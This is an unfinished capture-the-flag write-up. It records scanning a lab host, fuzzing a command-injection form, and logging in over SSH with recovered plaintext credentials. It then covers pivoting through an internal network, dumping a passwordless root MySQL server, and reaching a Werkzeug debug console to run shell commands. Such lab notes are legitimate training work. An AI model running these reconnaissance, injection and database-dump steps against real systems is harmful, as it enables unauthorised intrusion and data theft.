# Heading level 1

TODO: writeup comes here

# Nmap
```bash
nmap -T4 10.214.1.12 -p28080,22222,22121,30000-30009 -sV -Pn
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 12:38 CEST
Nmap scan report for 10.214.1.12
Host is up (0.067s latency).

PORT      STATE  SERVICE        VERSION
22121/tcp closed unknown
22222/tcp open   ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
28080/tcp open   http           Werkzeug httpd 3.1.3 (Python 3.11.14)
30000/tcp closed ndmps
30001/tcp closed pago-services1
30002/tcp closed pago-services2
30003/tcp closed amicon-fpsu-ra
30004/tcp closed amicon-fpsu-s
30005/tcp closed unknown
30006/tcp closed unknown
30007/tcp closed unknown
30008/tcp closed unknown
30009/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Http

```dirb
dirb http://10.214.1.12:28080/ -z 10
```
```
---- Scanning URL: http://10.214.1.12:28080/ ----
+ http://10.214.1.12:28080/console (CODE:400|SIZE:167)
+ http://10.214.1.12:28080/image (CODE:200|SIZE:129)
```

```bash
curl -s -X POST 'http://10.214.1.12:28080/' --data-raw 'cmd=ls /usr/local/bin /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin' | sed -n '/<pre/,/<\/pre>/p' > fuzz.txt
ffuf -w fuzz.txt -u http://10.214.1.12:28080/ -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'cmd=FUZZ' -t 10 -fr 'Try again'
```

* ls
* pwd
* whoami

+ whoami -> ssh user: `webuser`
+ image -> ssh pass: `kMTaJ8XR1SDCMV`

# SSH
```bash
sshpass -p kMTaJ8XR1SDCMV ssh webuser@10.214.1.12 -p 22222
sshpass -p kMTaJ8XR1SDCMV ssh webuser@10.214.1.12 -p 22222 -t /bin/bash --norc
```
userflag.txt
svg -> qr -> tinyurl -> yt rickroll (orig)
`https://tinyurl.com/3z6uwatv` -> `https://www.youtube.com/watch?v=dQw4w9WgXcQ`

# Sudo
/etc/bash.bashrc
```
alias sudo='echo "Nice try, my friend 8)"'
alias unalias='echo "UUU ALMOST!!"'
alias alias='echo "You thought, I did not changed this??"'
```

/usr/bin/sudo renamed to sudo.real and replaced with a sinple print
```
-e #!/bin/bash
echo "sudo has gone"
```

# Nmap

```bash
./nmap -T4 172.18.0.1/24 -p1-65535
```
```
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-20 10:27 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.00029s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
4004/tcp  open  unknown <- VPN chall http, CQ25{c0mmun1cat10n_ch3ck}
5355/tcp  open  hostmon
22121/tcp open  unknown
22222/tcp open  unknown
28080/tcp open  unknown
30000/tcp open  unknown
30001/tcp open  unknown
30002/tcp open  unknown
30003/tcp open  unknown
30004/tcp open  unknown
30005/tcp open  unknown
30006/tcp open  unknown
30007/tcp open  unknown
30008/tcp open  unknown
30009/tcp open  unknown

Nmap scan report for ced6d93eea0b (172.18.0.2)
Host is up (0.000085s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for challenges-db-1.challenges_internal_net (172.18.0.3)
Host is up (0.00041s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  mysql
33060/tcp open  unknown

Nmap scan report for challenges-web-1.challenges_internal_net (172.18.0.4)
Host is up (0.00064s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8080/tcp open  http-alt
```
# MySQL

```bash
mysql -h 172.18.0.3 -P 3306 -u root --password=
mysqldump -h 172.18.0.3 -P 3306 -u root --password= --all-databases > all_databases.sql
```

```
mysql> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.01 sec)

mysql> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
1 row in set (0.01 sec)
```

# Werkzeug console

```bash
curl -v -X POST http://10.214.1.12:28080/console -H 'Host: localhost'
```

`127-380-526`

`print(subprocess.check_output(["sh", "-c", "whoami"], text=True))`

# Flag
Flag was missing